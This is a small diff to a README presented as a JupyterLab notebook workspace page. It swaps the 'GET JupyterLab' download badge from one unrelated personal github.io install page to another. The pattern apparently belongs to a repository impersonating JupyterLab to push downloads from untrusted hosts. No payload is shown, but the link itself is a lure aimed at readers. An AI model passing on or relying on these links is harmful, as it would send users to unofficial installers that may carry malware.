@@ -1,6 +1,6 @@
 # JupyterLab - Web-Based Notebook and Data Science Workspace
 
-[![GET JupyterLab](https://img.shields.io/badge/GET%20%E2%80%94%20JupyterLab-0078D6?style=for-the-badge&logoColor=white)](https://tannerlawsonuwyy.github.io/.github/install-jupyterlab)
+[![GET JupyterLab](https://img.shields.io/badge/GET%20%E2%80%94%20JupyterLab-0078D6?style=for-the-badge&logoColor=white)](https://juanmayolgxu.github.io/.github/install-jupyterlab)
 
 ## Workspace Overview for JupyterLab
 
